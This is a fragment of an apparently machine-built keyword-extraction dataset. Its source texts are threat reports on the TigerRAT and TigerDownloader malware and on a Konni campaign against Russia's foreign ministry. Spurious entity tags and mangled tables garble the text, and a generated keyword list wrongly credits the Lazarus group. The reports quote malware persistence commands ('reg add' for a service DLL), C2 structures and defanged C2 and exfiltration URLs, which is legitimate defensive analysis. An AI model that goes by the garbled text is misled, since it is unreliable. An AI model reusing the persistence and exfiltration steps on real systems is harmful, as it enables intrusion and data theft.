AND TIGERDOWNLOADER MALWARE FAMILIES16TIGERRAT VARIANTS We recall from the code reuse and cluster analysis ( see Figure 8) that we could connect all RATs to the same TigerRAT family through code - reuse analysis . We have also seen that there are RAT variants that differ more substantially than the downloader variants . For instance , the variants RAT - Kaspersky- x64 and [ORG] RAT - [ORG] KrCERT - x64 share [PERCENT] only [PERCENT] about 50 % of their code . In this section , we take a closer look at the [ORG] RAT variants . We present strong new evidence on the functional and design levels that further attributes the [ORG] RAT variants at our disposal to the same TigerRAT malware family . We also show that variants mainly differ in terms of the [CARDINAL] C2 commands they implement . For this analysis , we \u2019ll focus on the representatives [ORG] RAT - [ORG] Kaspersky - x64 , [ORG] RAT - [ORG] KrCERT - x64 and [PERSON] RAT- [PERSON] Kaspersky - x86 which we established earlier ( see Figure [CARDINAL] 10 ) . COMMANDS AND CAPABILITIES PER VARIANT Let \u2019s look at the [CARDINAL] C2 commands which we have found in the different variants . Figure [CARDINAL] 16 shows all the [CARDINAL] C2 commands that we have observed in [CARDINAL] at [CARDINAL] least [CARDINAL] one of the [CARDINAL] three RAT variants . The absence of the commands with the ids [CARDINAL] 0x08 and 0x09 lead us to speculate that there are yet unknown samples in the wild which do include these commands . CommandIDSelfDeleteSystemInfoShellFileManagerKeyloggerSocksTunnelScreenCapturePortForwarder0x010x020x030x040x050x060x070x0aFigure [CARDINAL] 16 : Summary of all [CARDINAL] C2 commands which are available in [CARDINAL] at [CARDINAL] least [CARDINAL] one of the [CARDINAL] three RAT variants . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES17Next , we \u2019re looking at the [CARDINAL] C2 commands which are supported by the different variants ( see Figure [CARDINAL] 17).RAT variantCommandsRAT - [PERSON] Kaspersky - x86FileManager , [ORG] ScreenCapture , [ORG] SelfDelete , ShellRAT - [ORG] Kaspersky - x64FileManager , Keylogger , [ORG] ScreenCapture , [ORG] SelfDelete , [ORG] Shell , [ORG] SocksTunnel , SystemInfoRAT - [ORG] KrCERT - x64FileManager , [ORG] Keylogger , [ORG] PortForwarder , [ORG] ScreenCapture , [ORG] SelfDelete , [ORG] Shell , [ORG] SocksTunnel , SystemInfoFigure [CARDINAL] 17 : [CARDINAL] C2 commands found in the different RAT variants . We see that the [CARDINAL] three variants which we have automatically identified using cluster analysis are indeed [CARDINAL] three functionally distinct variants . Apart from these variations in [CARDINAL] C2 capabilities , the core code of the variants is largely identical . Thus , it is essentially the [CARDINAL] C2 commands that define the [CARDINAL] three variants . We also observe that the [CARDINAL] four commands \u201c FileManager , \u201d \u201c [WORK_OF_ART] ScreenCapture , \u201d \u201c SelfDelete \u201d and \u201c [ORG] Shell \u201d are common to all variants . [ORG] A [ORG] COMMON [ORG] INTERFACE [ORG] FOR [ORG] C2 [ORG] COMMANDS [ORG] We have found an interface that is common to all [CARDINAL] three variants , as follows : _ DWORD i d ; // Command i d t_MainStructure * MainStructure ; _ BYTE unk_data[0x10 ] ; void ( * init)(t_Module_GenericCommandInterface * a1 ) ; void ( * execute)(t_Module_GenericCommandInterface * a1 ) ; void ( * enable)(t_Module_GenericCommandInterface * a1 ) ; void ( * disable)(t_Module_GenericCommandInterface * a1 ) ; void * enabled ; } ; The interface provides an abstraction that is implemented by all [CARDINAL] C2 commands found in the RATs . This common interface establishes a strong relation between the variants within their core [CARDINAL] C2 functionalities . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES18NEW C2 PROTOCOL VARIANT IN RAT - KRCERT - X64 The C2 protocol is essentially identical across all variants . The exception is a minor protocol change which we spotted in the [ORG] RAT - [ORG] KrCERT - x64 variant . The change concerns the registration of the malware with the [CARDINAL] C2 and consists of an extra check located in the [ORG] TCP module , which is responsible for all communication with the C2 : struct t_TCP { void ( * constructor)(t_Module_TCP * a1 ) ; void ( * set_cncs)(t_Module_TCP * a1 ) ; void ( * connect_to_cnc)(t_Module_TCP * a1 ) ; void ( * check_response_from_cnc)(t_Module_TCP * a1 ) ; void ( * listen_to_new_commands)(t_Module_TCP * a1 ) ; void ( * close_socket)(t_Module_TCP * a1 ) ; void ( * send_data)(t_Module_TCP * a1 , t_EncData * a2 , int a3 ) ; void ( * process_recv_command)(t_Module_TCP * a1 ) ; void ( * enable_commands)(t_Module_TCP * a1 ) ; struct t_TCP_Variant_KrCERT - x64 { void ( * constructor)(t_Module_TCP * a1 ) ; void ( * set_cncs)(t_Module_TCP * a1 ) ; void ( * connect_to_cnc)(t_Module_TCP * a1 ) ; void ( * check_response_from_cnc)(t_Module_TCP * a1 ) ; void ( * new_check_from_cnc_response)(t_Module_TCP * a1 ) ; // new in [ORG] RAT - [ORG] KrCERT - x64 variant void ( * listen_to_new_commands)(t_Module_TCP * a1 ) ; void ( * close_socket)(t_Module_TCP * a1 ) ; void ( * send_data)(t_Module_TCP * a1 , t_EncData * a2 , int a3 ) ; void ( * process_recv_command)(t_Module_TCP * a1 ) ; void ( * enable_commands)(t_Module_TCP * a1 ) ; void * var_1 ; } ; In Figure [CARDINAL] 18 , the red rectangle contains the new protocol check which was added to the [ORG] RAT - KrCERT- x64 variant . Figure [CARDINAL] 18 : Left , other variants ; right , [ORG] RAT - [ORG] KrCERT - x64 variant . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES19The new function essentially sends a [QUANTITY] 17 - byte length chunk to the C2 . We have not analyzed what data is sent , but it looks like it could be related to a bot identifier or something similar . Once the data is sent , it checks that the C2 returns the string \" n0gyPPx \" ( see Figure [CARDINAL] 19).Figure 19 : C2 protocol check for \" n0gyPPx . \"In addition to this protocol change , we have also observed a change in the HTTP header that is sent at the beginning of the communication in the very [ORDINAL] first request by the [ORG] RAT - [ORG] KrCERT - x64 variant ( see Figure [CARDINAL] 20).RAT variantHTTP headerRAT - KrCERT - x64HTTP [CARDINAL] 1.1 /index.php?member = sbi2009 SSL3.3.7RAT - KrCERT - x64 , [ORG] RAT - [ORG] Kaspersky - x86HTTP [ORG] 1.1 /member.php SSL3.4Figure [CARDINAL] 20 : HTTP header variants . Based on this protocol analysis , we believe that [ORG] RAT - [ORG] KrCERT - x64 is a slightly newer version of the [ORG] RAT which is at the same time clearly related to the other versions . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES20CONCLUSIONS Our analysis revealed new evidence and insights enabling us to attribute the previously reported [PERSON] Andariel [PERSON] APT binaries by [GPE] Malwarebytes , [PERSON] Kaspersky and [ORG] KrCERT to [CARDINAL] two new malware families . We call these the [ORG] TigerDownloader and TigerRAT families , using names originally introduced by [ORG] KrCERT . We have also seen that all the binaries are related by the same packing scheme . Our results are based on both automated code - reuse analysis and manual analysis of the malware tooling reported in the previous reports . To facilitate further research and defense capabilities , we are sharing our unpacking and config- extraction scripts as well as data with the community ( url The analysis in this report is based on the malware samples at our disposal at the time of writing . During our analysis , we found indicators suggesting that additional , not yet publicly known , variants may exist . Since threat analysis and attribution is data driven and evolving work , additional samples may complete our current findings or lead to new findings . We invite you to contact us with additional information , particularly if you can share suspected or confirmed [ORG] TigerDownloader or TigerRAT binaries . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES21APPENDIX [PERSON] ALLEGED [PERSON] COMPILATION DATES We have looked at the compilation timestamps of the packed samples and concluded that they are randomly chosen . For instance , some timestamps are in the future ( e.g. , \u201c [CARDINAL] 2024/06/09 \u201d ) and others [DATE] many [DATE] years in the past ( e.g. , \u201c [CARDINAL] 1996/10/17 \u201d ) . On the other hand , we have found that the compilation dates of the unpacked samples appear reasonable and likely correspond to the effective compilation dates . In fact , the unpacked compilation timestamp is always before the [ORDINAL] first seen date . In many cases , it is [DATE] 1 [DATE] to [DATE] 2 [DATE] days before the [ORDINAL] first seen date which makes sense due to the time delay between the infection / detection and reporting / submission to platforms like [ORG] VirusTotal . Also , none of the dates are in the future or unrealistically old . While these still could be false flags , it is reasonable to assume that the compilation dates of the unpacked samples correspond to their effective production date . We also see that most of the [ORDINAL] 3rd stage ( TigerRAT ) samples were detected before the [ORDINAL] 2nd stage ( [ORG] TigerDownloader ) samples . This could indicate that until a host becomes infected by the [ORDINAL] 3rd stage , the [ORDINAL] 2nd stage samples are not detected . It could also be due to the fact that [ORDINAL] 2nd stage samples are stealthier and have fewer features / functions . The raw data is shown in the table below . Packed hashUnpackedhashArch . StageCompilationCompilationx64Downloader ( [DATE] 2nd [DATE] stage)f4765f7b089d 1996 - 04 - 05time(unpacked sample ) 2020 - [DATE] 12 - 13First seen ( packed)First seen ( unpacked)2021 - 04 - 21 2021 - 06 - 19x64Downloader ( [ORDINAL] 2nd stage)1996 - 10 - 172020 - 12 - 032021 - 04 - 13 2021 - 04 - 22x64Downloader ( [ORDINAL] 2nd stage)1996 - 10 - 172020 - 12 - 032021 - 04 - 20 2021 - 04 - 22x64Downloader ( [ORDINAL] 2nd stage)1996 - 04 - 052020 - 12 - 112021 - 04 - 19 2021 - 04 - 19ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES226310cd9f8b6a ( [ORDINAL] 2nd stage)1996 - 04 - 052020 - 12 - 112021 - 04 - 19 2021 - 04 - 19x64Downloader ( [ORDINAL] 2nd stage)1996 - 04 - 052020 - 12 - 112021 - 05 - 11 2021 - 04 - 19x64x64Downloader persistence)1996 - 10 - 132020 - 11 - 242021 - 04 - 27 2021 - 04 - 271996 - 10 - 132020 - 11 - 242021 - 04 - 27 2021 - 04 - 271996 - 10 - 132020 - 11 - 242021 - 04 - 28 2021 - 04 - 27x86Downloader ( [ORDINAL] 2nd stage)1996 - 09 - 082020 - 07 - 202020 - 07 - 22 2020 - 07 - 22x64RAT ( [ORDINAL] 3rd stage)2023 - 11 - 282020 - 10 - 182020 - 10 - 19 2021 - 06 - 17x64RAT ( [ORDINAL] 3rd stage \u2013 Variant 3)1997 - [CARDINAL] 09 - 302021 - 01 - 182021 - 06 - 30 2021 - 10 - 21ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES23d231f3b6d6e Variant 3)RAT ( [ORDINAL] 3rd stage \u2013 Variant 3)RAT ( [ORDINAL] 3rd stage \u2013 Variant 2)RAT ( [ORDINAL] 3rd stage \u2013 Variant 2)RAT ( [ORDINAL] 3rd stage \u2013 Variant 2)RAT ( [ORDINAL] 3rd stage \u2013 Variant 2)RAT ( [ORDINAL] 3rd stage \u2013 Variant 2)RAT ( [ORDINAL] 3rd stage \u2013 Variant 2)2021 - 10 - 122020 - 12 - 132021 - 04 - 21 2021 - 06 - 211997 - 04 - 292020 - 11 - 242021 - 04 - 21 2021 - 04 - 211995 - 08 - 152020 - 09 - 212020 - 09 - 26 2021 - 06 - 172024 - 06 - 092021 - 01 - 112021 - 01 - 21 2021 - 01 - 212024 - 06 - 092021 - 01 - 112021 - 01 - 25 2021 - 01 - 212024 - 06 - 092021 - 01 - 112021 - 01 - 25 2021 - 01 - 212024 - 06 - 092021 - 01 - 112021 - 01 - 25 2021 - 01 - 212024 - 06 - 092021 - 01 - 112021 - 01 - 25 2021 - 01 - 21ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES24 - 87f389d8f3a6 Variant 2)RAT ( [ORDINAL] 3rd stage \u2013 Variant 1)RAT ( [ORDINAL] 3rd stage \u2013 Variant 1)RAT ( [ORDINAL] 3rd stage - Variant 1)RAT ( [ORDINAL] 3rd stage \u2013 Variant 1)RAT ( [ORDINAL] 3rd stage \u2013 Variant 1)RAT ( [ORDINAL] 3rd stage \u2013 Variant 1)RAT ( [ORDINAL] 3rd stage \u2013 Variant 1)2021 - 01 - 112021 - 01 - 252000 - 07 - 072020 - 08 - 272020 - 09 - 24 2020 - 09 - 242000 - 07 - 072020 - 08 - 272020 - 09 - 25 2020 - 09 - 252000 - 07 - 072020 - 08 - 272020 - 09 - 25 2020 - 09 - 252000 - 07 - 072020 - 08 - 272020 - 09 - 24 2020 - 09 - 242000 - 07 - 072020 - 08 - 272020 - 09 - 24 2020 - 09 - 242000 - 07 - 072020 - 08 - 272020 - 09 - 24 2020 - 09 - 242000 - 07 - 072020 - 08 - 272020 - 09 - 25 2020 - 09 - 25ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES250dc3f66f4af32 Variant 1)RAT ( [ORDINAL] 3rd stage \u2013 Variant 1)464eaa82103f ee6580672000 - 07 - 072020 - 08 - 272020 - 09 - 24 2020 - 09 - 242000 - 07 - 072020 - 08 - 272020 - 09 - 24 2020 - 09 - 24ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES26EXTRACTED C2S Another indicator to group these samples could be the C2 used by each sample . To do so , we created a config extractor for these samples . The following table shows the [ORG] C2s for each sample . The [ORDINAL] 2nd stage samples use a domain whereas the [ORDINAL] 3rd stage samples directly use an [ORG] IP address . NOTE : In the configuration of the [ORDINAL] 3rd stage there are [CARDINAL] 4 hardcoded IPs . In almost all cases , [CARDINAL] three of them are the same [ORG] IP which belong to the C2 . The remaining [ORG] IP is empty in some cases , and in following table . You can find the \u201c raw \u201d configuration here : url hxxp://mail.neocyon.com/jsp/user/sms/sms_recv.jspUnpacked hashf32f6b229913d68daad937c stage)RAT ( [ORDINAL] 3rd stage)RAT ( [ORDINAL] 3rd stage)RAT ( [ORDINAL] 3rd stage)ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES271177105e51fa02f9977bd43 stage)x64 [PERSON] Downloa [PERSON] x86hxxp://www.jinjinpig.co.kr/Anyboard/skin/board.php hxxp://mail.namusoft.kr/jsp/user/eam/board.jsphxxp://snum.or.kr/skin_img/skin.php hxxp://www.ddjm.co.kr/bbs/icon/skin/skin.phphxxp://www.jinjinpig.co.kr/Anyboard/skin/board.php hxxp://mail.namusoft.kr/jsp/user/eam/board.jsphxxp://www.conkorea.com/cshop/banner/list.php hxxp://www.allamwith.com/home/mobile/list.phpESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES28MITRE [PERSON] ATT&CK [PERSON] MAPPING The table below shows the MITRE ATT&CK Mapping after combining all these attacks / campaigns from previous reports and our analysis . TechniqueTacticTechnique NameT1584.006Resource DevelopmentCompromise Infrastructure : Web ServicesT1583.003Resource DevelopmentAcquire Infrastructure : Virtual Private ServerT1566.001Initial AccessPhishing : Spearphishing AttachmentT1189Initial [ORG] AccessDrive - by CompromiseT1204.002ExecutionT1059.007ExecutionUser Execution : Malicious [ORG] FileCommand and Scripting Interpreter : JavaScriptT1036.005Defense EvasionMasquerading : [PERSON] Match [PERSON] Legitimate [PERSON] Name or [ORG] LocationT1027.003Defense [ORG] EvasionObfuscated [ORG] Files [ORG] or Information : [ORG] SteganographyT1497.001Defense EvasionVirtualization / Sandbox Evasion : [ORG] System [ORG] ChecksT1049T1057T1113DiscoveryDiscoveryCollectionSystem [ORG] Network [ORG] Connections DiscoveryProcess DiscoveryScreen CaptureT1056.001CollectionInput Capture : KeyloggingT1071.001Command and ControlApplication Layer Protocol : Web ProtocolsT1095Command and ControlNon - Application [ORG] Layer [ORG] ProtocolT1573.001Command and ControlEncrypted Channel : Symmetric CryptographyT1041T1486ExfiltrationImpactExfiltration Over C2 ChannelData Encrypted for ImpactESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES29ABOUT THREATRAYThreatray is a novel malware analysis and intelligence platform . We support all key malware defense use cases , including identification / detection , hunting , response , and analysis . Threatray helps security teams of all skill levels to effectively identify and analyze ongoing and past compromises . At the core of Threatray are highly scalable code similarity search algorithms that find code reuse between a new and [CARDINAL] millions of known samples in seconds . Our core search algorithms do not make use of traditional byte pattern matches and are thus highly resilient to code mutations . Our user facing features are based on the core search technology . They include best of class threat family identification and detection , easy to use real - time retro - hunting and retro - detection , cluster analysis to quickly find relevant IOCs , and low - level multi - binary analysis capabilities . Some of our binary analysis capabilities have been used for the research presented in this report . Contact us at url or url THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES30", "generated_text": "analysis; the malware tools; TigerDownloader; TigerRAT; Malwarebytes; the analysis; code reuse; similarities; the malware; the Lazarus group; the attacks; South Korean entities; financial gain; cyber espionage; the malware; the Lazarus group; the attacks; the samples; the same downloader; RAT payloads; different versions; persistence capabilities; the similarities; RATs; detection; the authors; the same malware families; the same RAT payloads; the same commands; the same malware; the same keystrokes; The report; indicators; the attacks; RATs; the same RAT payloads; the same malware samples; the group; the same RAT payloads; detail; the APT; RAT use.", "ref_text": "<START-1>The report analyzes malware families called TigerRAT and TigerDownloader used in attacks on South Korean entities attributed to the Andariel APT group. It builds on previous research by Malwarebytes, Kaspersky, and the Korean CERT on these attacks. The report finds all malware samples are related through a common packing scheme, though the downloader and RAT families are code-wise distinct. It identifies 3 variants of the TigerRAT and 2 of the TigerDownloader through code reuse analysis. The TigerDownloader variants mainly differ in whether persistence is achieved. The TigerRAT variants differ more substantially in their command and control capabilities. But they share an interface for C2 commands and minor protocol differences, evidencing evolution of the malware. Enrichment of infrastructure links and C2s is provided to facilitate further research. The report concludes by mapping the malware capabilities to MITRE ATT&CK techniques across the full attack chain from infrastructure compromise to data exfiltration. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": NaN, "gpt3/lexical/rouge_rouge2": NaN, "gpt3/lexical/rouge_rougeL": NaN, "gpt3/lexical/rouge_rougeLsum": NaN, "gpt3_generated_text": []}, {"split_name": "val", "sample_id": "val_4", "prompt_text": "Extract the keywords: [ORG] New [ORG] Konni [ORG] Campaign [ORG] Kicks [ORG] Off the New Year by [ORG] Targeting [ORG] Russian [ORG] Ministry of Foreign Affairsblog.lumen.com/new-konni-campaign-targeting-russian-ministry-of-foreign-affairs/January 5 , 2022Black Lotus Labs Posted On [DATE] January [DATE] 5 , [CARDINAL] 2022Executive Summary Black Lotus Labs , the threat research team of [ORG] Lumen [ORG] Technologies , uncovered a series of targeted actions against [ORG] the [ORG] Russian [ORG] Federation \u2019s [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs ( MID ) . Based upon the totality of information available and the close correlation with prior reporting , we assess with moderate confidence these actions leveraged the [NORP] Konni malware , which has previously been associated with [ORG] the [ORG] Democratic People \u2019s [ORG] Republic [ORG] of [ORG] Korea , and were undertaken to establish access to the [ORG] MID network for the purpose of espionage . This activity cluster demonstrates the patient and persistent nature of advanced actors in waging multi - phased campaigns against perceived high - value networks . After gaining access through stolen credentials , the actor was able to exploit trusted connections to distribute and load the malware , [ORDINAL] first by impersonating a government software program coinciding with new [NORP] Covid mandates , and then through sending trojanized files from a compromised account.1/10Introduction In [DATE] October [DATE] 2021 , a presumed phishing campaign targeted [ORG] the [ORG] Russian [ORG] Federation [ORG] MID with links to a series of spoofed [ORG] MID portals to harvest credentials from [ORG] MID personnel . The actor then deployed [PERSON] Covid - related lures in [DATE] November [DATE] 2021 consisting of malicious URLs that downloaded files impersonating [ORG] the [ORG] Department [ORG] of [ORG] Health [ORG] and [ORG] Health [ORG] Service . [CARDINAL] One of the files installed a fake version of the [NORP] Russian - mandated vaccination registration software and served as a loader for additional malicious files . In [DATE] December [DATE] 2021 , after successfully compromising the email account of a staff member of the [ORG] MID , the threat actor targeted [CARDINAL] at [CARDINAL] least [CARDINAL] two other MID entities via emails from the compromised account : [ORG] the [ORG] Russian [ORG] Embassy in [GPE] Indonesia and a deputy minister overseeing non - proliferation and arms control , among other responsibilities . The emails propagated a \u201c Happy [EVENT] New [EVENT] Year \u2019s \u201d message containing a trojanized screensaver attachment . These activity clusters are connected in a number of ways : [ORDINAL] First , the spoofed hostnames from the [DATE] October cluster resolved to the same malicious [ORG] IP that sent the targeted emails containing the screensaver . [ORDINAL] Second , the initially observed TTPs used in the [DATE] November activity correlated to the [DATE] December activity . Finally , the screensaver from the [DATE] December activity downloaded a [ORDINAL] first - stage agent which is nearly identical to the agent previously reported by [GPE] Malwarebytes . Technical DetailsFigure 1 : Overview of [NORP] Konni campaign against [ORG] Russian [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs ( MID)2/10October 2021 : Phishing for Initial Access We assess the campaign began on or [DATE] around [DATE] October [DATE] 19 , [DATE] 2021 , with the initial goal of harvesting credentials . [ORG] The [ORG] Black [ORG] Lotus [ORG] Labs team discovered a series of spoofed hostnames impersonating [ORG] MID portals that all resolved to the same single IP address : [CARDINAL] 152.89.247[.]26 . [CARDINAL] One hostname , portal.newint - mid.ru.carnegieinsider[.]com , had a Let \u2019s Encrypt X.509 certificate that was issued on [DATE] October [DATE] 19 , 2021.Figure [CARDINAL] 2 : Screenshot of [ORG] the Let \u2019s [ORG] Encrypt [ORG] X.509 certificate for a spoofed [ORG] MID portal hostnameIn addition , we discovered [CARDINAL] two other spoofed hostnames resolving to the [CARDINAL] 152.89.247[.]26 IP address during mid - [DATE] October . These additional hostnames referenced email services frequently used in [GPE] Russia , such as Yandex and mail.ru : [PERSON] e.mail.ru.settings.pronto- [PERSON] login[.]com and passport.yandex.ru - settings.pronto - login[.]com . All the spoofed hostnames that resolved to this [ORG] IP address used either the domain pronto- [ORG] login[.]com or [ORG] carnegieinsider[.]com . For a full list of spoofed hostnames , see the Indicators of Compromise section at the end of this report . [DATE] November [DATE] 2021 : [ORG] Covid [ORG] Vaccination [ORG] Registration [ORG] Activity [ORG] Based upon file metadata , we assess that the next cluster of activity occurred on [DATE] approximately [DATE] November [DATE] 7 , [DATE] 2021 . In this timeframe , the threat actor sent out malicious URL links that , if clicked , downloaded a file that was hosted on Yandex \u2019s cloud service.3/10Figure [CARDINAL] 3 : The malicious hyperlink to download the .zip fileThe downloaded .zip file ( named oloo@mid.ru.zip ) impersonated the \u201c \u041e\u0422\u0414\u0415\u041b \u041b\u0415\u0427\u0415\u0411\u041d\u041e- \u041e\u0417\u0414\u041e\u0420\u041e\u0412\u0418\u0422\u0415\u041b\u042c\u041d\u041e\u0413\u041e \u041e\u0411\u0415\u0421\u041f\u0415\u0427\u0415\u041d\u0418\u042f , \u201d which loosely translates to [ORG] the \u201c [ORG] Department [ORG] of [ORG] Health [ORG] and [ORG] Health [ORG] Services [ORG] for [ORG] the [ORG] Russian [ORG] Federation [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs . \u201d This .zip file contained several benign PDFs and Word documents that asked the recipient to provide information regarding vaccination status and to sign a consent form . The timing of this activity closely aligned with the passage of [ORG] Russian [ORG] Vaccine [ORG] Passport laws that mandated [NORP] Russians had to receive a QR code from the government to prove vaccination in order to access public places such as restaurants and bars.4/10Figure [CARDINAL] 4 : [CARDINAL] One of the files downloaded from Yandex cloud that discussed the vaccine mandateThe .zip file also contained an installer file called oloo@mid.ru/\u041f\u0420\u041e\u0413\u0420\u0410\u041c\u041c\u0410 \u0414\u041b\u042f \u0420\u0415\u0413\u0418\u0421\u0422\u0420\u0410\u0426\u0418\u0418 \u041f\u0420\u0418\u0412\u0418\u0422\u042b\u0425 \u0412 \u0424\u0415\u0414\u0415\u0420\u0410\u041b\u042c\u041d\u041e\u041c \u0420\u0415\u0413\u0418\u0421\u0422\u0420\u0415 \u0412\u0410\u041a\u0426\u0418\u041d\u0418\u0420\u041e\u0412\u0410\u041d\u041d\u042b\u0425.exe which translates to \u201c Program for Vaccination Registration in [ORG] the [ORG] Federal [ORG] Registry.exe . \u201d This installer impersonated a legitimate software the [NORP] Russian people were directed to install in order to receive QR codes verifying their vaccination status . If invoked , this installer would also surreptitiously run a malicious loader file that attempted to retrieve a compressed file from the threat actor hostname victory- [CARDINAL] 2020.atwebpages[.]com . Unfortunately , we were not able to recover a copy of the [ORDINAL] first stage payload . However , the functionality for the Covid registration loader is nearly identical to that of the loader used in a [DATE] December [DATE] 2021 [DATE] activity.5/10December [DATE] 2021 : Happy [EVENT] New [EVENT] Year \u2019s Activity On [DATE] December 20 , [DATE] 2021 , we detected malicious emails being sent from a compromised [ORG] MID account , [ORG] mskhlystova@mid[.]ru . When we examined the email headers , we identified they were originating from the same [ORG] IP address from the [DATE] October phishing activity , [CARDINAL] 152.89.247[.]26 . Copies of the malicious emails and their translations are below . Figure [CARDINAL] 5 : Screenshot of [CARDINAL] two malicious emails sent by the threat actorFigure [CARDINAL] 6 : [LANGUAGE] English translation of the emailsAs of the time of this writing , we have identified [CARDINAL] two recipients of the emails , although we suspect there are more . The [ORDINAL] first was sent to [ORG] the [ORG] Russian [ORG] Embassy in [GPE] Indonesia : rusemb.indonesia@mid[.]ru . The [ORDINAL] second email was sent to [PERSON] Sergey [PERSON] Alexeyevich [PERSON] Ryabkov who was , according to a cached version of the [ORG] MID website at [DATE] the [DATE] end [DATE] of [DATE] December [DATE] 2021 , responsible for \u201c bilateral relations with [GPE] North [GPE] and [GPE] South [GPE] America , non - proliferation and arms control , [GPE] Iran \u2019s nuclear program and [GPE] Russia \u2019s participation in the [ORG] BRICS association , \u201d an international alliance comprised of [GPE] Brazil , [GPE] Russia , [GPE] India , [GPE] China and [GPE] South [GPE] Africa . [ Note : The [ORG] MID website link is no longer active.]If the malicious email was opened , it prompted the user to download and click the attached .zip file titled \u201c \u043f\u043e\u0437\u0434\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u201d , which means \u201c Congratulations . \u201d Upon decompression , it revealed a screensaver file by the same name that , when clicked,6/10displayed a festive holiday screensaver wishing the recipient a [EVENT] Happy [EVENT] New [EVENT] Year while also surreptitiously running a light - weight loader to retrieve a file from the C2 node at hxxp://i758769.atwebpages[.]com . Figure [CARDINAL] 7 : Benign Happy [EVENT] New [EVENT] Year \u2019s screensaver that was displayed on the infected machineWhen we analyzed the network communications generated by the screensaver file , we noticed an interesting evasion technique . When the loader file reached out to the threat actor command and control node to obtain the [ORDINAL] first stage payload , the actor configured the server to respond with a code of \u201c [CARDINAL] 401 unauthorized . \u201d Typically , a [CARDINAL] 401 error means the user making the request was not authorized to view the webpage and , in many cases , it results in the session being terminated . However , in this case , the website returned a malicious payload in the [ORDINAL] second part of the response . This was likely a tactic to avoid detection . Figure [CARDINAL] 8 : Screenshot showing the [CARDINAL] C2 serving a [CARDINAL] 401 error code with the accompanying payload7/10The C2 node served the requesting machine a Microsoft Cabinet File ( .cab ) . Once the .cab file was decompressed , it contained [CARDINAL] three more files : install.bat , scrnsvc.dll and scrnsvc.ini . Figure [CARDINAL] 9 : Overview of the Happy New Year \u2019s activityThese files were placed at the following location : % windir%/system32/. The install.bat file created a service called \u201c [ORG] ScreenSaver [ORG] Management [ORG] Service \u201d that executed the malicious files on start . It then modified [CARDINAL] two registry keys on the infected machine . [PERSON] Reg add \u201c [WORK_OF_ART] HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost \u201d /v scrnsvc /t REG_MULTI_SZ /d \u201c scrnsvc \u201d /f > nulreg add \u201c HKLM\\SYSTEM\\CurrentControlSet\\Services\\scrnsvc\\Parameters \u201d /v [ORG] ServiceDll /t REG_EXPAND_SZ /d \u201c % windir%\\System32\\scrnsvc.dll \u201d /f > nulIf the scrnsvc.dll and scrnsvc.ini files were already on the host machine , they were copied to the file path % windir%\\System32 . The .bat file then attempted to clean up some of the artifacts and launched the .dll file . The .dll file checked the infected machine for the presence of a .dat file at the following location : % windir%/system32 / scrnsvc.dat . If no such file was found , it decrypted the contents of scrnsvc.ini which contained the threat actor hostname ( url The .dll file then downloaded a file from url and saved it as % windir%/system32 / scrnsvc.dat . Once decrypted , the [ORG] scrnsvc.dat revealed the location of the [ORDINAL] second command and control server at hostname url the .dll file performed some basic host - based reconnaissance on the infected machine . It ran the systeminfo command from the command line of the infected machine to allow the threat actor to obtain information such as : hostname , OS name , OS version , domain , processor , [ORG] BIOS version , etc . The .dll file then compressed the contents of the systeminfo command as a .cab file , encrypted it and uploaded it to the [ORDINAL] second threat actor - controlled hostname ( hxxp://h378576.atwebpages[.]com / up.php ? name = COMPUTER_NAME ) , which prompted a \u201c success ! \u201d message as the response . Figure [CARDINAL] 10 : Screen shot depicting \u201c success ! \u201d messageNext , the.dll file obtained a list of all the running tasks , via tasklist , on the infected machine and repeated the same process of compressing , encrypting and subsequently uploading that file to the threat actor C2.The .dll file then attempted to download another payload from the [ORDINAL] second C2 h378576.atwebpages[.]com / dn.php?name={Host name}&prefix = cc ( 0 ) . It entered a loop where the agent slept and attempted to reach back out to obtain the next payload at the URL h378576.atwebpages[.]com / dn.php?name={Host Name}&prefix = tt . Unfortunately , we were unable to recover a copy of the next payload . We suspect that the threat actor only served the next payload to a limited number of targeted machines based upon the contents of systeminfo and tasklist information that was uploaded to the [PRODUCT] C2.Based on the observed TTPs , including the use of a light - weight loader to retrieve a .cab file comprised of install.bat , the use of .dll to call an .ini file , the host - based commands and similar URL structures for the [ORG] C2s , we observe strong correlation with the malware previously reported as [NORP] Konni . Conclusion At Black Lotus Labs , we continue to track the use of [NORP] Konni malware . While this particular campaign was highly targeted , it is vital for defenders to understand the evolving capabilities of advanced actors to achieve infection of coveted targets.9/10We advise our customers to perform full monitoring of network resources , use of multifactor authentication and reemphasizing the importance of phishing awareness to employees . These defensive measures that can help protect sensitive networks from this type of malicious activity . Black Lotus Labs blocked the threat actor infrastructure across the [NORP] Lumen global [ORG] IP network to protect customers and the wider internet ecosystem in the event that this actor re - uses the infrastructure in future campaigns . We also added these indicators to the Black Lotus Labs reputation system , which feeds [GPE] Lumen \u2019s security portfolio . We will continue to follow this activity to detect and disrupt similar campaigns , and we encourage other organizations to alert on these and similar indicators in their environments . For additional IoCs such as file hashes associated with this campaign , please visit our [PERSON] GitHub page . If you would like to collaborate on similar research , please contact us on [PRODUCT] Twitter [PRODUCT] @BlackLotusLabs . This analysis was performed by [PERSON] Danny [PERSON] Adamitis and [PERSON] Steve [PERSON] Rudd . This information is provided 